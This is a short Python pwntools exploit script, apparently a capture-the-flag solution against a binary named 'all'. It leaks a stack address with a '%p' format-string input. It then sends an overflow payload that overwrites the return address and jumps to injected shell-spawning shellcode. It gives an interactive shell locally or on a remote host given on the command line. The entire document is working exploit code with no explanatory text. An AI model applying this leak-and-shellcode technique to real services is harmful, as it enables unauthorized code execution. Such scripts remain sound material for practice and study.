from pwn import *
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './all'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
LEAKPAYLOAD = b'%p'
p.send(LEAKPAYLOAD)
leak = int(p.recv(), 16)

#gdb.attach(p, 'b *0x4011e7')

shellcode = asm(shellcraft.sh())
ret = leak + 48
PAYLOAD = b'quit\x00' + 35 * b'a' + p64(ret) + shellcode
p.send(PAYLOAD)

p.interactive()